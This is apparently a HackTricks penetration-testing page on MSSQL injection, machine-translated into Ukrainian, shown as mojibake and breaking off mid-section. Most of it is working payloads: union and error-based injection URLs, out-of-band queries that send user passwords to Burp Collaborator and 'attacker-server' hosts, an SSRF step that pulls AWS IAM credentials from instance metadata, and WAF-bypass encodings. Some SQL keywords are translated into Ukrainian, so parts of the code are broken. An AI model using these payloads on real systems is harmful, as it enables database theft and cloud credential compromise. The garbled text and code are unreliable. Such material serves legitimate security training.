# –í–Ω–µ–¥—Ä–µ–Ω–Ω—è MSSQL

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –ü–µ—Ä–µ–ª—ñ–∫ Active Directory

–ú–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ–º–µ–Ω—É —á–µ—Ä–µ–∑ SQL-—ñ–Ω'—î–∫—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ MSSQL**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó MSSQL:

* **`SELECT DEFAULT_DOMAIN()`**: –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–µ —ñ–º'—è –¥–æ–º–µ–Ω—É.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: –Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ —ñ–º'—è –¥–æ–º–µ–Ω—É (_DOMAIN_ —É —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ), —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ–≤–µ—Ä–Ω–µ **SID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä** —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ. –¶–µ –±—É–¥–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —è–∫ `0x01050000000[...]0000f401`, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–æ—Å—Ç–∞–Ω–Ω—ñ 4 –±–∞–π—Ç–∏** - —Ü–µ —á–∏—Å–ª–æ **500** —É —Ñ–æ—Ä–º–∞—Ç—ñ **big endian**, —è–∫–µ —î **–∑–∞–≥–∞–ª—å–Ω–∏–º —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**.\
–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º **–∑–Ω–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –¥–æ–º–µ–Ω—É** (—É—Å—ñ –±–∞–π—Ç–∏, –∫—Ä—ñ–º –æ—Å—Ç–∞–Ω–Ω—ñ—Ö 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –ø–æ–≤–µ—Ä–Ω–µ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∫–∞–∑–∞–Ω–æ–≥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º** (—è–∫—â–æ —Ç–∞–∫–∏–π —î), —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É **0000e803** —É —Ñ–æ—Ä–º–∞—Ç—ñ big endian == **1000** (–∑–∞–∑–≤–∏—á–∞–π —Ü–µ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –ø–µ—Ä—à–æ–≥–æ –∑–≤–∏—á–∞–π–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ). –ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ —É—è–≤–∏—Ç–∏, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–±—Ä–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤—ñ–¥ 1000 –¥–æ 2000 —ñ, –π–º–æ–≤—ñ—Ä–Ω–æ, –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ–º–µ–Ω—É. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é, –ø–æ–¥—ñ–±–Ω—É –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ñ –≤–µ–∫—Ç–æ—Ä–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫**

SQL-—ñ–Ω'—î–∫—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫ –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–≥–∞–¥—É—é—Ç—å –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `+AND+1=@@version--` —Ç–∞ –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ ¬´OR¬ª. –ó–∞–ø–∏—Ç–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å —Ç–∞–∫—ñ –≤–∏—Ä–∞–∑–∏, –∑–∞–∑–≤–∏—á–∞–π –±–ª–æ–∫—É—é—Ç—å—Å—è WAF. –î–ª—è –æ–±—Ö—ñ–¥—É —Å–∫–æ–Ω–∫–∞—Ç–µ–Ω—É–π—Ç–µ —Ä—è–¥–æ–∫, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–∏–º–≤–æ–ª %2b –∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤ —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ —Å–ø—Ä–∏—á–∏–Ω—è—é—Ç—å –ø–æ–º–∏–ª–∫—É –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó —Ç–∏–ø—É –¥–∞–Ω–∏—Ö –Ω–∞ —à—É–∫–∞–Ω—ñ –¥–∞–Ω—ñ.

–î–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞–∫–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

–ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

–¶—ñ —Ç—Ä—é–∫–∏ SSRF [–±—É–ª–∏ –≤–∑—è—Ç—ñ –∑–≤—ñ–¥—Å–∏](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

–î–ª—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ–∑–≤—ñ–ª **`VIEW SERVER STATE`** –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

–í–∏–º–∞–≥–∞—î –¥–æ–∑–≤–æ–ª—É **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

–î–ª—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ–∑–≤—ñ–ª **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

–ó–±–µ—Ä–µ–∂–µ–Ω—ñ –ø—Ä–æ—Ü–µ–¥—É—Ä–∏, —Ç–∞–∫—ñ —è–∫ `xp_dirtree`, —Ö–æ—á–∞ —ñ –Ω–µ –æ—Ñ—ñ—Ü—ñ–π–Ω–æ –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–æ–≤–∞–Ω—ñ Microsoft, –±—É–ª–∏ –æ–ø–∏—Å–∞–Ω—ñ —ñ–Ω—à–∏–º–∏ –æ–Ω–ª–∞–π–Ω —á–µ—Ä–µ–∑ —ó—Ö–Ω—é –∫–æ—Ä–∏—Å–Ω—ñ—Å—Ç—å —É –º–µ—Ä–µ–∂–µ–≤–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ—è—Ö –≤ MSSQL. –¶—ñ –ø—Ä–æ—Ü–µ–¥—É—Ä–∏ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ –∑–≤'—è–∑–∫—É, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ —Ä—ñ–∑–Ω–∏—Ö [–ø—Ä–∏–∫–ª–∞–¥–∞—Ö](https://www.notsosecure.com/oob-exploitation-cheatsheet/) —Ç–∞ [–ø–æ—Å—Ç–∏](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ `xp_dirtree` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤, –∞–ª–µ –≤–æ–Ω–∞ –æ–±–º–µ–∂–µ–Ω–∞ –ª–∏—à–µ –ø–æ—Ä—Ç–æ–º TCP 445. –ù–æ–º–µ—Ä –ø–æ—Ä—Ç—É –Ω–µ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏, –∞–ª–µ –≤–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î —á–∏—Ç–∞—Ç–∏ –∑ –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ–∫–∞–∑–∞–Ω–æ –≤ SQL-—Å–∫—Ä–∏–ø—Ç—ñ –Ω–∏–∂—á–µ:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
–¶–µ–π –º–µ—Ç–æ–¥ –º–æ–∂–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –Ω–∞ –≤—Å—ñ—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è—Ö —Å–∏—Å—Ç–µ–º, —Ç–∞–∫–∏—Ö —è–∫ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`, —â–æ –ø—Ä–∞—Ü—é—î –Ω–∞ `Windows Server 2016 Datacenter` –∑ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

–ö—Ä—ñ–º —Ç–æ–≥–æ, —ñ—Å–Ω—É—é—Ç—å –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ñ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –ø—Ä–æ—Ü–µ–¥—É—Ä–∏, —Ç–∞–∫—ñ —è–∫ `master..xp_fileexist` —Ç–∞ `xp_subdirs`, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ—Å—è–≥—Ç–∏ –ø–æ–¥—ñ–±–Ω–∏—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ `xp_fileexist` –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —É —Ü—ñ–π [—Å—Ç–∞—Ç—Ç—ñ TechNet](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

–û—á–µ–≤–∏–¥–Ω–æ, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`xp_cmdshell`** –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è** —á–æ–≥–æ—Å—å, —â–æ —Å–ø—Ä–∏—á–∏–Ω—è—î **SSRF**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó **–ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π —Ä–æ–∑–¥—ñ–ª** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

–°—Ç–≤–æ—Ä–µ–Ω–Ω—è CLR UDF (—Ñ—É–Ω–∫—Ü—ñ—ó, –≤–∏–∑–Ω–∞—á–µ–Ω–æ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º Common Language Runtime), —è–∫–∞ —î –∫–æ–¥–æ–º, –Ω–∞–ø–∏—Å–∞–Ω–∏–º –Ω–∞ –±—É–¥—å-—è–∫—ñ–π –º–æ–≤—ñ .NET —Ç–∞ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–º —É DLL, –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ MSSQL –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–ª–∞—Å–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, - —Ü–µ –ø—Ä–æ—Ü–µ—Å, —è–∫–∏–π –≤–∏–º–∞–≥–∞—î –¥–æ—Å—Ç—É–ø—É `dbo`. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —Ü–µ –∑–∞–∑–≤–∏—á–∞–π –º–æ–∂–ª–∏–≤–æ –ª–∏—à–µ —Ç–æ–¥—ñ, –∫–æ–ª–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —è–∫ `sa` –∞–±–æ –∑ —Ä–æ–ª–ª—é –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

–£ —Ü—å–æ–º—É [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó Github](https://github.com/infiniteloopltd/SQLHttp) –Ω–∞–¥–∞—é—Ç—å—Å—è –ø—Ä–æ–µ–∫—Ç Visual Studio —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó —â–æ–¥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–ª—è —Å–ø—Ä–æ—â–µ–Ω–Ω—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É –≤ MSSQL —è–∫ CLR-—Å–±–æ—Ä–∫–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ HTTP GET-–∑–∞–ø–∏—Ç–∏ –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ MSSQL.

–û—Å–Ω–æ–≤–∞ —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ —É–≤—ñ–±—Ä–∞–Ω–∞ –≤ —Ñ–∞–π–ª `http.cs`, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–ª–∞—Å `WebClient` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—É GET —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
–ü–µ—Ä–µ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º SQL-–∫–æ–º–∞–Ω–¥–∏ `CREATE ASSEMBLY` —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç SQL-–∫–æ–¥—É –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Ö–µ—à—É SHA512 –∑–±—ñ—Ä–∫–∏ –¥–æ —Å–ø–∏—Å–∫—É –¥–æ–≤—ñ—Ä–µ–Ω–∏—Ö –∑–±—ñ—Ä–æ–∫ —Å–µ—Ä–≤–µ—Ä–∞ (—è–∫–∏–π –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
–ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∑–±—ñ—Ä–∫–∏ —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó, –º–æ–∂–Ω–∞ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º SQL-–∫–æ–¥–æ–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è HTTP-–∑–∞–ø–∏—Ç—ñ–≤:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **–®–≤–∏–¥–∫–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è: –û—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É –≤—Å—ñ—î—ó —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –æ–¥–∏–Ω –∑–∞–ø–∏—Ç**

[–•–∏—Ç –≤—ñ–¥—Å–∏](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

–ö–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –º–µ—Ç–æ–¥ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –æ–¥–∏–Ω –∑–∞–ø–∏—Ç –≤–∫–ª—é—á–∞—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–ª–æ–∑—É–ª—É `FOR JSON`. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ —î –±—ñ–ª—å—à —Å—Ç–∏—Å–ª–∏–º, –Ω—ñ–∂ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–ª–æ–∑—É–ª—É `FOR XML`, —è–∫–∏–π –≤–∏–º–∞–≥–∞—î –ø–µ–≤–Ω–æ–≥–æ —Ä–µ–∂–∏–º—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, "raw". –ö–ª–æ–∑—É–ª `FOR JSON` –≤—ñ–¥–¥–∞—î—Ç—å—Å—è –∑–∞ –π–æ–≥–æ –ª–∞–∫–æ–Ω—ñ—á–Ω—ñ—Å—Ç—å.

–û—Å—å —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å—Ö–µ–º—É, —Ç–∞–±–ª–∏—Ü—ñ —Ç–∞ —Å—Ç–æ–≤–ø—Ü—ñ –∑ –ø–æ—Ç–æ—á–Ω–æ—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
https://vuln.app/getItem?id=1'+—Ç–∞+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 –∏–ª–∏ %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
```plaintext
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
```plaintext
–í–ò–ë–†–ê–¢–ò '–∞' –í–ò–ë–†–ê–¢–ò 'b'
```
```

So for example, multiple queries such as:

```sql
–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [tempdb]
—Å—Ç–≤–æ—Ä—ñ—Ç—å —Ç–∞–±–ª–∏—Ü—é [test] ([id] int)
–≤—Å—Ç–∞–≤—Ç–µ [test] –∑–Ω–∞—á–µ–Ω–Ω—è (1)
–≤–∏–±–µ—Ä—ñ—Ç—å [id] –∑ [test]
–≤–∏–¥–∞–ª—ñ—Ç—å —Ç–∞–±–ª–∏—Ü—é [test]
```

Can be reduced to:

```sql
